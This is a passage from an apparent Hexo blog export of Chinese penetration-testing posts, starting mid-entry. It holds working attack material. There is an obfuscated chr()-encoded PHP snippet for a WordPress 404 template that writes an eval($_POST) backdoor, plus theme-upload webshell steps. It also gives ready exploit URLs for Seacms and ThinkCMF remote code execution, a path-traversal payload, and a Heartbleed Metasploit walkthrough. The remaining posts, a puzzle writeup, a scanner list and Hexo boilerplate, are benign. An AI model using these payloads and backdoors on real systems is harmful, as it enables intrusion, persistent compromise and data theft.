        <content type="html"><![CDATA[<p>worldpress是一款主流的博客系统，但是关于它的漏洞也层出不穷。<br>这次是因为一次CTF靶场遇到此类情况，顺便做个简单记录。</p><p>worldpress系统本身比较安全，但是因为它可以自定义插件，很多时候因为插件作者安全开发的能力有高有低，导致许多安全漏洞的出现。</p><h2 id="0x01-弱口令"><a href="#0x01-弱口令" class="headerlink" title="0x01 弱口令"></a>0x01 弱口令</h2><p>后台默认地址为：<code>xxxx/wp-admin/</code></p><p>没有验证码可以暴力破解，常见用户名admin,worldpress,system等。</p><p>进入后台后的利用：</p><p>1 上传主题包getshell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">本机建立目录“upkn”,把一句话1.php放进去。打包upkn目录为zip文件。WP后台的主题管理，上传主题，安装。则你的后门路径为：</span><br><span class="line">wp-content&#x2F;themes&#x2F;upkn&#x2F;1.php。</span><br></pre></td></tr></table></figure><p>2 修改主题文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">“外观”-“编辑”-“404模板</span><br><span class="line">&lt;script language&#x3D;&quot;php&quot;&gt;fputs(fopen(chr(46).chr(47).chr(97).chr(46).chr(112).chr(104).chr(112),w),chr(60).chr(63).chr(101).chr(118).chr(97).chr(108).chr(40).chr(36).chr(95).chr(80).chr(79).chr(83).chr(84).chr(91).chr(97).chr(93).chr(41).chr(59).chr(63).chr(62));&lt;&#x2F;script&gt;</span><br><span class="line">插到文件头</span><br><span class="line">点404模板的时候地址栏有相对路径，默认是wp-content&#x2F;themes&#x2F;twentyten&#x2F;404.php</span><br><span class="line">更新完直接访问localhost&#x2F;wp-content&#x2F;themes&#x2F;twentyten&#x2F;404.php就会在twentyten目录生成一句话后门a.php 密码a</span><br></pre></td></tr></table></figure><h2 id="0x02-插件漏洞利用"><a href="#0x02-插件漏洞利用" class="headerlink" title="0x02 插件漏洞利用"></a>0x02 插件漏洞利用</h2><p>插件漏洞类型很多，例如xss,sql注入，rce等。</p><p>推荐工具方便自查：<a href="https://github.com/wpscanteam/wpscan" target="_blank" rel="noopener">https://github.com/wpscanteam/wpscan</a></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一次实战遇到的心脏滴血(CVE-2014-0160)</title>
      <link href="/2020/06/01/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AE%9E%E6%88%98%E9%81%87%E5%88%B0%E7%9A%84%E5%BF%83%E8%84%8F%E6%BB%B4%E8%A1%80-CVE-2014-0160/"/>
      <url>/2020/06/01/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AE%9E%E6%88%98%E9%81%87%E5%88%B0%E7%9A%84%E5%BF%83%E8%84%8F%E6%BB%B4%E8%A1%80-CVE-2014-0160/</url>
      
        <content type="html"><![CDATA[<h1 id="心脏滴血-CVE-2014-0160"><a href="#心脏滴血-CVE-2014-0160" class="headerlink" title="心脏滴血(CVE-2014-0160)"></a>心脏滴血(CVE-2014-0160)</h1><hr><h2 id="0x01-概念"><a href="#0x01-概念" class="headerlink" title="0x01 概念"></a>0x01 概念</h2><p>心脏出血（英语：Heartbleed），也简称为心血漏洞，是一个出现在加密程序库OpenSSL的安全漏洞，该程序库广泛用于实现互联网的传输层安全（TLS）协议。它于2012年被引入了软件中，2014年4月首次向公众披露。只要使用的是存在缺陷的OpenSSL实例，无论是服务器还是客户端，都可能因此而受到攻击。此问题的原因是在实现TLS的心跳扩展时没有对输入进行适当验证（缺少边界检查），因此漏洞的名称来源于“心跳”（heartbeat）。该程序错误属于缓冲区过读，即可以读取的数据比应该允许读取的还多。</p><p>摘自百度百科</p><p>更专业的说：</p><p>OpenSSL的Heartbleed模块存在一个BUG，当攻击者构造一个特殊的数据包，满足用户心跳包中无法提供足够多的数据会导致memcpy函数把SSLv3记录之后的数据直接输出，该漏洞导致攻击者可以远程读取存在漏洞版本的OpenSSL服务器内存中多达64K的数据。</p><h2 id="0x02-受影响的版本"><a href="#0x02-受影响的版本" class="headerlink" title="0x02 受影响的版本"></a>0x02 受影响的版本</h2><ul><li>OpenSSL 1.0.2-beta</li><li>OpenSSL 1.0.1 - OpenSSL 1.0.1f<h2 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h2>使用工具：<code>Metasploit</code><br>第一步     <code>搜索模块</code> ps:搜索关键字即可<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search heartbleed</span><br></pre></td></tr></table></figure><img src="https://img-blog.csdnimg.cn/20200302190955624.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM5MzI2ODE2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>第二步     <code>使用模块</code><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary&#x2F;scanner&#x2F;ssl&#x2F;openssl_heartbleed</span><br></pre></td></tr></table></figure></li></ul><p>第三步    <code>查看参数</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show options    发现需要设置目标ip，端口443默认设置。</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200302191402487.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM5MzI2ODE2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>第四步     <code>设置参数利用</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set rhosts  目标ip              设置目标ip</span><br><span class="line">set verbose true                设置内容现实</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200302191733204.png" alt="在这里插入图片描述">)<img src="https://img-blog.csdnimg.cn/202003021917490.png" alt="在这里插入图片描述"><br>第五步     <code>攻击利用</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run&#x2F;exploit    两个命令都可以</span><br></pre></td></tr></table></figure><h2 id="0x04-漏洞危害"><a href="#0x04-漏洞危害" class="headerlink" title="0x04 漏洞危害"></a>0x04 漏洞危害</h2><p><code>下图就是攻击后返的内容:</code><br><img src="https://img-blog.csdnimg.cn/20200302192147349.png" alt="在这里插入图片描述"><br>我们可以通过该漏洞读取每次攻击泄露出来的信息，所以可能也可以获取到服务器的私钥，用户cookie和密码等。上图为获取到的账户密码信息。</p><h2 id="0x05-漏洞修复"><a href="#0x05-漏洞修复" class="headerlink" title="0x05 漏洞修复"></a>0x05 漏洞修复</h2><ul><li>停止旧版的 openssl 服务，升级 openssl 到新版本，并重新启动。</li><li>修改密码。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>梦想cms v1.4 后台存在任意文件读取漏洞</title>
      <link href="/2020/06/01/%E6%A2%A6%E6%83%B3cms-v1-4-%E5%90%8E%E5%8F%B0%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"/>
      <url>/2020/06/01/%E6%A2%A6%E6%83%B3cms-v1-4-%E5%90%8E%E5%8F%B0%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<p><strong>我的第一个CNVD编号：CNVD-2020-10212</strong></p><p><strong>实验环境：win7 专业版  梦想cms v1.4 phpstudy</strong></p><p>漏洞位置：<br>template\admin\Template\temedit.html目录下的模版编辑功能<br> <img src="https://img-blog.csdnimg.cn/2020032109291647.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM5MzI2ODE2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>发现该地方直接将路径和文件名进行了拼接，其中代码关键在于变量$dir的获取<br>搜索editfile函数<br><img src="https://img-blog.csdnimg.cn/20200321093041502.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM5MzI2ODE2,size_16,color_FFFFFF,t_70" alt="11"></p><p>发现$dir直接通过GET方式进行获取，没有进行过滤，且直接拼接进文件内容请求链接。<br>漏洞链接为：<br><code>xxx.com/admin.php?m=Template&amp;a=editfile&amp;dir=default/error.html</code><br>随便在目录下创建1.txt（内容为happy new year）验证猜想。<br>  <img src="https://img-blog.csdnimg.cn/20200321092942146.png" alt="在这里插入图片描述"></p><p>将dir参数值改为“../1.txt”，发现成功获取文件内容。</p><p><img src="https://img-blog.csdnimg.cn/20200321093134902.png" alt="在这里插入图片描述"></p><p>构造payload,尝试获取C盘根目录的Windows/system.ini文件<br><code>xxx.com/admin.php?m=Template&amp;a=editfile&amp;dir=../../../../../Windows/system.ini</code><br><img src="https://img-blog.csdnimg.cn/20200321093149160.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM5MzI2ODE2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>成功验证！</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Gitee七周年码力检测1-4关writeup</title>
      <link href="/2020/06/01/Gitee%E4%B8%83%E5%91%A8%E5%B9%B4%E7%A0%81%E5%8A%9B%E6%A3%80%E6%B5%8B1-4%E5%85%B3writeup/"/>
      <url>/2020/06/01/Gitee%E4%B8%83%E5%91%A8%E5%B9%B4%E7%A0%81%E5%8A%9B%E6%A3%80%E6%B5%8B1-4%E5%85%B3writeup/</url>
      
        <content type="html"><![CDATA[<p><code>题目地址：https://oschina.gitee.io/gitee-7th/#/game</code></p><h2 id="0x01-第一关"><a href="#0x01-第一关" class="headerlink" title="0x01 第一关"></a>0x01 第一关</h2><p><img src="https://imgkr.cn-bj.ufileos.com/fa9c2c21-935a-447c-b71f-ebe03d7c1d1c.png" alt=""></p><h3 id="解题思路："><a href="#解题思路：" class="headerlink" title="解题思路："></a>解题思路：</h3><p>base64解码字符串，拼接<code>gitee</code>,访问最终地址：<code>https://gitee.com/mvphp</code>即可找到flag</p><p><img src="https://imgkr.cn-bj.ufileos.com/9f39e2e0-fa4d-4522-a445-4820e2b513cd.png" alt=""></p><h2 id="0x02-第二关"><a href="#0x02-第二关" class="headerlink" title="0x02 第二关"></a>0x02 第二关</h2><p><img src="https://imgkr.cn-bj.ufileos.com/72c79231-25ad-42d6-ad0d-54238264cbf2.png" alt=""></p><h3 id="解题思路：-1"><a href="#解题思路：-1" class="headerlink" title="解题思路："></a>解题思路：</h3><p>在gitee搜索<code>阴祸德芙</code>，找到房间，并打开桌子文件，利用在线网站解密摩斯密码皆可通关，最终答案为<code>saiban</code></p><p><img src="https://imgkr.cn-bj.ufileos.com/394af19a-d470-4c54-a669-e02a276c85a2.png" alt=""><br><img src="https://imgkr.cn-bj.ufileos.com/60f1e54d-46d7-40cd-bd90-5835ea8c47b1.png" alt=""></p><h2 id="0x03-第三关"><a href="#0x03-第三关" class="headerlink" title="0x03 第三关"></a>0x03 第三关</h2><p><img src="https://imgkr.cn-bj.ufileos.com/f59a5fa6-8c34-452e-8aba-4b66b37e1446.png" alt=""></p><h3 id="解题思路：-2"><a href="#解题思路：-2" class="headerlink" title="解题思路："></a>解题思路：</h3><p>利用给出文章的音调排列，一二声为平，代表数字0。三四声为仄，代表数字1。</p><p>利用在线网站进行二进制转ASCII，文章最终翻译为<br><br>01100010 b<br><br>01110101 u<br><br>01100111 g<br><br>01110000 p<br><br>01101100 l<br><br>01100001 a<br><br>01101110 n<br><br>01100101 e<br><br>01110100 t<br><br>flag为<code>bugplanet</code></p><h2 id="0x04-第四关"><a href="#0x04-第四关" class="headerlink" title="0x04 第四关"></a>0x04 第四关</h2><p><img src="https://imgkr.cn-bj.ufileos.com/773e9609-72fe-44bb-9029-855066ad2032.png" alt=""></p><h3 id="解题思路：-3"><a href="#解题思路：-3" class="headerlink" title="解题思路："></a>解题思路：</h3><p>说是有规律，但是没找出来，233。<br></p><p>ID位置确实三位字符，<br>第一位可能为<code>JXLMN</code>中一位<br>第二位可能为<code>PQRST</code>中一位<br>第三位确定为<code>X</code><br></p><p>密码位置两位字符，<br>第一位可能为<code>fgh</code>中一位<br>第二位可能为<code>opqr</code>中一位<br></p><p>利用了web爆破思路进行爆破</p><p><img src="https://imgkr.cn-bj.ufileos.com/2822980f-0910-4842-9d23-7b2d789c102b.png" alt=""></p><p><img src="https://imgkr.cn-bj.ufileos.com/af5de26e-4986-4430-ac49-dd1b49cf43bd.png" alt=""></p><p>登录后发现平面图，直接F12审查黄点元素，填入坐标格式flag即可，最终flag为<code>83,117</code></p><p><img src="https://imgkr.cn-bj.ufileos.com/4ee52195-6987-4920-984c-edbcc2dc3157.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Seacms getshell</title>
      <link href="/2020/06/01/Seacms-getshell/"/>
      <url>/2020/06/01/Seacms-getshell/</url>
      
        <content type="html"><![CDATA[<p>海洋影视管理系统(seacms，海洋cms)是一套专为不同需求的站长而设计的视频点播系统。</p><h2 id="0x01-利用EXP"><a href="#0x01-利用EXP" class="headerlink" title="0x01 利用EXP"></a>0x01 利用EXP</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;xxxx.com&#x2F;search.php?searchtype&#x3D;5&amp;searchword&#x3D;&#123;if&#123;searchpage:year&#125;&amp;year&#x3D;:e&#123;searchpage:area&#125;&#125;&amp;area&#x3D;v&#123;searchpage:letter&#125;&amp;letter&#x3D;al&#123;searchpage:lang&#125;&amp;yuyan&#x3D;(join&#123;searchpage:jq&#125;&amp;jq&#x3D;($_P&#123;searchpage:ver&#125;&amp;&amp;ver&#x3D;OST[9]))</span><br></pre></td></tr></table></figure><h2 id="0x02-webshell"><a href="#0x02-webshell" class="headerlink" title="0x02 webshell"></a>0x02 webshell</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">URl 链接为shell地址，密码为 9[]</span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zMi5heDF4LmNvbS8yMDE5LzExLzA2L01pZUN2VC5wbmc?x-oss-process=image/format,png" alt="avatar"><br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zMi5heDF4LmNvbS8yMDE5LzExLzA2L01pZTkyVi5wbmc?x-oss-process=image/format,png" alt="avatar"></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ThinkCMF框架任意内容包含漏洞</title>
      <link href="/2020/05/31/ThinkCMF%E6%A1%86%E6%9E%B6%E4%BB%BB%E6%84%8F%E5%86%85%E5%AE%B9%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"/>
      <url>/2020/05/31/ThinkCMF%E6%A1%86%E6%9E%B6%E4%BB%BB%E6%84%8F%E5%86%85%E5%AE%B9%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<p>ThinkCMF是一款基于PHP+MYSQL开发的中文内容管理框架，底层采用ThinkPHP3.2.3构建。</p><a id="more"></a><h2 id="0x01影响版本"><a href="#0x01影响版本" class="headerlink" title="0x01影响版本"></a>0x01影响版本</h2><p>ThinkCMF X1.6.0</p><p>ThinkCMF X2.1.0</p><p>ThinkCMF X2.2.0</p><p>ThinkCMF X2.2.1</p><p>ThinkCMF X2.2.2</p><p>ThinkCMF X2.2.3</p><h2 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02 漏洞利用"></a>0x02 漏洞利用</h2><p>通过构造a参数的fetch方法，可以不需要知道文件路径就可以把php代码写入文件<br>exp：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;xxx.com&#x2F;?a&#x3D;fetch&amp;templateFile&#x3D;public&#x2F;index&amp;prefix&#x3D;&#39;&#39;&amp;content&#x3D;&lt;php&gt;file_put_contents(&#39;test.php&#39;,&#39;&lt;?php phpinfo();?&gt;&#39;)&lt;&#x2F;php&gt;</span><br></pre></td></tr></table></figure><p>最终会在目录下生成test.php的shell一句话。</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>APP在线检测网站集合</title>
      <link href="/2020/05/31/APP%E5%9C%A8%E7%BA%BF%E6%A3%80%E6%B5%8B%E7%BD%91%E7%AB%99%E9%9B%86%E5%90%88/"/>
      <url>/2020/05/31/APP%E5%9C%A8%E7%BA%BF%E6%A3%80%E6%B5%8B%E7%BD%91%E7%AB%99%E9%9B%86%E5%90%88/</url>
      
        <content type="html"><![CDATA[<p>腾讯金刚审计系统 <a href="http://service.security.tencent.com/kingkong" target="_blank" rel="noopener">http://service.security.tencent.com/kingkong</a> 免费 无限制<br>腾讯御安全 <a href="http://yaq.qq.com/" target="_blank" rel="noopener">http://yaq.qq.com/</a> 免费 查看漏洞详情需认证<br>阿里聚安全 <a href="http://jaq.alibaba.com/" target="_blank" rel="noopener">http://jaq.alibaba.com/</a> 免费 查看漏洞详情需认证<br>360显微镜 <a href="http://appscan.360.cn/" target="_blank" rel="noopener">http://appscan.360.cn/</a> 免费 无限制<br>360APP漏洞扫描 <a href="http://dev.360.cn/html/vulscan/scanning.html" target="_blank" rel="noopener">http://dev.360.cn/html/vulscan/scanning.html</a> 免费 无限制<br>百度MTC <a href="http://mtc.baidu.com" target="_blank" rel="noopener">http://mtc.baidu.com</a> 9.9元/次 无限制<br>梆梆 <a href="https://dev.bangcle.com" target="_blank" rel="noopener">https://dev.bangcle.com</a> 免费 无限制<br>爱内测 <a href="http://www.ineice.com/" target="_blank" rel="noopener">http://www.ineice.com/</a> 免费 无限制<br>通付盾 <a href="http://www.appfortify.cn/" target="_blank" rel="noopener">http://www.appfortify.cn/</a> 免费 无限制<br>NAGA <a href="http://www.nagain.com/appscan/" target="_blank" rel="noopener">http://www.nagain.com/appscan/</a> 免费 无限制<br>GES审计系统 <a href="http://01hackcode.com/" target="_blank" rel="noopener">http://01hackcode.com/</a> 免费 无限制<br>盘古出品的Janeus<a href="http://appscan.io" target="_blank" rel="noopener">http://appscan.io</a><br>Janus <a href="http://cloud.appscan.io" target="_blank" rel="noopener">http://cloud.appscan.io</a><br>APP逆向main_classify_list <a href="https://android.fallible.co/" target="_blank" rel="noopener">https://android.fallible.co/</a><br>java在线反编译Java decompiler online <a href="http://www.javadecompilers.com" target="_blank" rel="noopener">http://www.javadecompilers.com</a><br>腾讯电脑管家：哈勃 <a href="http://habo.qq.com/" target="_blank" rel="noopener">http://habo.qq.com/</a><br>腾讯TSRC：金刚 <a href="http://service.security.tencent.com/" target="_blank" rel="noopener">http://service.security.tencent.com/</a><br>阿里聚安全：<a href="http://jaq.alibaba.com/" target="_blank" rel="noopener">http://jaq.alibaba.com/</a><br>西安交通大学 sanddroid：<a href="http://sanddroid.xjtu.edu.cn/#home" target="_blank" rel="noopener">http://sanddroid.xjtu.edu.cn/#home</a><br>金山火眼：<a href="http://fireeye.ijinshan.com/analyse.html" target="_blank" rel="noopener">http://fireeye.ijinshan.com/analyse.html</a><br>瀚海源文件B超：<a href="https://b-chao.com" target="_blank" rel="noopener">https://b-chao.com</a></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>SQLMap_os-shell文件写入失败可能性</title>
      <link href="/2020/05/31/SQLMap_os-shell%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E5%A4%B1%E8%B4%A5%E5%8F%AF%E8%83%BD%E6%80%A7/"/>
      <url>/2020/05/31/SQLMap_os-shell%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E5%A4%B1%E8%B4%A5%E5%8F%AF%E8%83%BD%E6%80%A7/</url>
      
        <content type="html"><![CDATA[<p>1.Windows下：修改my.ini 在[mysqld]内加入 secure_file_priv =<br>2.Linux下：       修改my.cnf 在[mysqld]内加入 secure_file_priv =</p><p>MYSQL新特性secure_file_priv对读写文件的影响,然后重启mysql，即可写入文件！</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>测试</title>
      <link href="/2020/05/31/%E6%B5%8B%E8%AF%95/"/>
      <url>/2020/05/31/%E6%B5%8B%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<p>sasasascsa</p><a id="more"></a><p>dsdsds</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2020/05/31/hello-world/"/>
      <url>/2020/05/31/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
